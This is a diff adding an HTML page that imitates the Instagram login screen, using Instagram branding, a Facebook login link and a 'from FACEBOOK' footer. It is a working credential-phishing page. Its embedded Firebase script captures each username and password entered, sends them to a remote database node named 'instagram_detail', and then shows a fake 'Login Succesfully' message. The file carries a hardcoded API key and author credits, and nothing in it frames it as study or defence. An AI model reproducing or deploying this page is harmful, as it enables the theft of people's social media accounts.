@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><link rel="icon" href="https://img.icons8.com/ios-filled/32/000000/instagram-new.png" type="image/gif" sizes="16x16">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <link rel="stylesheet" href="style.css" >
+  <title>Instagram</title>
+</head>
+<style>
+
+  * {
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande',
+    'Lucida Sans', Arial, sans-serif;
+  color: black;
+  background-color:white;
+  background-size:cover;
+  background-position:center;
+  background-attachment:fixed;
+}
+
+form {
+  max-width: 400px;
+  margin: 35px auto;
+  border-radius: 10px;
+  padding: 10px 15px;
+  background-color:white;
+}
+
+h1 {
+  margin: 0 0 30px 0;
+  text-align: center;
+  margin-top: 5px;
+}
+
+.alert {
+  text-align: center;
+  padding: 10px;
+  background: rgb(168, 240, 177);
+  color: green;
+  margin-bottom: 10px;
+  display: none;
+}
+
+input[type='text'],
+input[type='email'],
+input[type='password'],
+textarea,
+select {
+  background: lightsteelblue;
+  border: 1px;
+  margin-bottom: 25px;
+  box-shadow: 2px;
+  color: black;
+  background-color: white;
+  width: 100%;
+  padding: 15px;
+  margin: 0;
+  height: auto;
+  font-size: 15px;
+}
+
+select {
+  padding: 6px;
+  height: 32px;
+  border-radius: 2px;
+}
+
+fieldset {
+  margin-bottom: 30px;
+  border: none;
+}
+
+legend {
+  display: block;
+  margin-bottom: 8px;
+}
+
+label.light {
+  font-weight: 300;
+  display: inline;
+}
+
+.section {
+  background-color: rgb(68, 114, 221);
+  color: black;
+  height: 29px;
+  display: inline-block;
+  width: 29px;
+  border-radius: 100%;
+  text-align: center;
+  line-height: 30px;
+  margin-righ
+  t: 4px;
+  font-size: 0.7em;
+}
+
+label {
+  display: block;
+  margin-bottom: 8px;
+}
+
+button {
+  padding: 25px 40px;
+  color: whitesmoke;
+  background-color: rgb(36, 159, 235);
+  font-size: 15px;
+  margin: 30px 0px 0px;
+  width: 100%;
+  text-align: center;
+  border-radius: 5px;
+}
+
+@media screen and (min-width: 480px) {
+  form {
+    max-width: 480px;
+  }
+}
+#link{
+text-color: rgb(36, 159, 235);
+text-decoration:none;
+}
+#link{
+margin-left:100px auto;
+color: rgb(36, 159, 235);
+text-decoration:none;
+text-align:center;}
+</style>
+<body>
+  <form action="" method="POST" id="registrationform"><br>
+      <img src="https://github.com/kabir01arya/instagram/raw/main/ss.png"><br><br>
+      <a href="https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221cf0p101npfap1ay7hht1plys4w1cikhgk1p2kia61el7f8l1qspvzm%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D05500835-78ef-4aa2-8c79-203926121d21%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221cf0p101npfap1ay7hht1plys4w1cikhgk1p2kia61el7f8l1qspvzm%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=http%3A%2F%2Fwww.instagram.com%2F&_rdr"><img src="https://github.com/kabir01arya/instagram/raw/main/fblogin.png" width="500"></a><br>
+      <img src="https://github.com/kabir01arya/instagram/raw/main/or.png" width="500">
+    <br><br>
+    <div class="alert">Login Succesfully...</div>
+    <fieldset>
+      <!-- Section 1 -->
+
+      <label class="" for="name">Phone number ,username ,or email :</label>
+      <input type="text" name="name" value="" id="name" ,placeholder="Phone number ,username ,or email" required />
+
+
+
+      <label for="password">Password : </label>
+      <input type="password" name="password" value="" id="password" required />
+        <a id="link" href="https://www.instagram.com/accounts/password/reset/">Forgot password ?</a>
+    </fieldset>
+
+
+
+      <button type="submit" sendMessage()>Log in</button>
+          <center>Don't have an account ? <a id="link" href="https://www.instagram.com/accounts/password/reset/">Sign up</a></center>
+<center><br><br><br><br><br><br><br><br><br>from<br><tt><strong>F&nbsp;A&nbsp;C&nbsp;E&nbsp;B&nbsp;O&nbsp;O&nbsp;K</strong></tt><br><br><br><br>&copy;Kabir Arya<br>
+
+                        <a class="social-icon" href="https://www.instagram.com/kabir_arya001/"><i class="fab fa-instagram"><img src="https://img.icons8.com/ios-filled/32/000000/instagram-new.png"/></i></a>
+                        <a class="social-icon" href="https://www.github.com/kabir_arya"><i class="fab fa-github"></i><img src="https://img.icons8.com/ios-glyphs/32/000000/github.png"/></a>
+                        <a class="social-icon" href="https://t.me/kabir_arya001"><i class="fab fa-telegram"></i><img src="https://img.icons8.com/ios-filled/32/000000/telegram-app.png"/></a>
+                        <a class="social-icon" href="https://discord.gg/cMM4YmqY"><i class="fab fa-discord"></i><img src="https://img.icons8.com/ios-glyphs/32/000000/discord-logo.png"/></a>
+
+    </center>
+  </form>
+
+  <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase.js"></script>
+  <script>
+    var config = {
+ apiKey: "AIzaSyCl3bdtNP3B-Q9qFseGKOVL7w1uSgOAIXg",
+ authDomain: "login-45d8e.firebaseapp.com",
+ databaseURL: "https://login-45d8e.firebaseio.com",
+ projectId: "login-45d8e",
+ storageBucket: "login-45d8e.appspot.com",
+ messagingSenderId: "19175076422",
+ appId: "1:19175076422:web:0130fbe9b0957ad5c71047",
+ measurementId: "G-36PD53GGSE"
+};
+firebase.initializeApp(config);
+
+//Reference for form collection(3)
+let formMessage = firebase.database()
+ .ref('instagram_detail');
+
+//listen for submit event//(1)
+document
+ .getElementById('registrationform')
+ .addEventListener('submit',
+  formSubmit);
+
+//Submit form(1.2)
+function formSubmit(e) {
+ e.preventDefault();
+ // Get Values from the DOM
+ let name = document.querySelector(
+  '#name').value;
+
+ let password = document.querySelector(
+  '#password').value;
+
+ //send message values
+ sendMessage(name,  password);
+
+ //Show Alert Message(5)
+ document.querySelector('.alert').style
+  .display = 'block';
+
+ //Hide Alert Message After Seven Seconds(6)
+ setTimeout(function() {
+  document.querySelector('.alert')
+
+   .style.display = 'none';
+ }, 7000);
+
+ //Form Reset After Submission(7)
+ document.getElementById(
+  'registrationform').reset();
+}
+
+//Send Message to Firebase(4)
+
+function sendMessage(name,
+ password) {
+ let newFormMessage = formMessage
+  .push();
+ newFormMessage.set({
+  name: name,
+
+  password: password,
+
+ });
+}
+  </script>
+</body>
+
+</html>
